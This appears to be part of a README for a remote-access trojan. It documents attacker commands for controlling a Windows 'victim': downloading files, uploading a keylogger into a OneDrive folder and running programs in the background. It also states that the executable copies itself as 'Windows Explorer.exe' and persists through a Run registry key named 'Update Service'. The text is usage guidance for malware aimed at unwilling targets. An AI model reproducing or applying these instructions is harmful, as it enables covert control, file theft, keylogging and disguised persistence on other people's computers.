* <code>-l</code> or <code>--local</code> do local command
* <code>--no_split</code> don't split command
* <code>download file_name</code>(file will be download from victim to your working directory)
* <code>upload file_name</code>(file will be upload to target machine to it wotking directory)
* <code>& command</code> Don't wait for the result , simply pass the command to the victim
* <code> exit </code> (Don't close connection without exit)
## Some Examples
1. ***-l cd /home/username/Desktop*** (change directory in local machine, in our case: attack machine)
2. ***dir*** (command for target machine , in our case: WIndows)
3. ***download sample.exe*** (Download file sample.exe from victim(file sample.exe must be in victim local directory) to attacker to his/her working directory: in out case it's: /home/username/Desktop)
4. ***cd C:\Users\admin\AppData\Local\Microsoft\OneDrive*** (change working victim directory)
5. ***upload keylogger.exe*** (Upload file: keylogger exe from attacer(keylogger.exe must be in ouer working directory again, our case: /home/username/Desktop) to victim working directory(C:\Users\AppData\Local\Microft\OneDrive)
6. ***cd C:\Program Files\Google\Chrome\Application***</br>
   ***& chrome.exe some_link***( Start command in background, if you don't do this you will wait for the result of victim computer, and it give you result only when  vectim user close chrome.exe)
  7. ***--no_split C:Program Files\Google\Chrome\Application\chrome.exe***(Don't split command , so in our case command sends as ["C:ProgramFiles\Google\Chrome\Application\chrome.exe"]. Int's working with ***cd*** also because cd don't split the rest of the command after intself for default.(["cd"," C:Program Files\Google\Chrome\Application\chrome.exe"]
  8. If you put incorrect command , program hasn't closed. It give you message of error
  9. The main concept is : Victim always waiting . Close connection correct from attacker , using exit
  ## And one more think ##
  * In first start , if you running exe file , file copyied itself in C:\Users\admin\AppData\Windows Explorer.exe
  * It adding itself to auto-upload(HKCU - > Software -> Microsoft -> Windows -> CurrentVersion -> Run ; named Update Service)
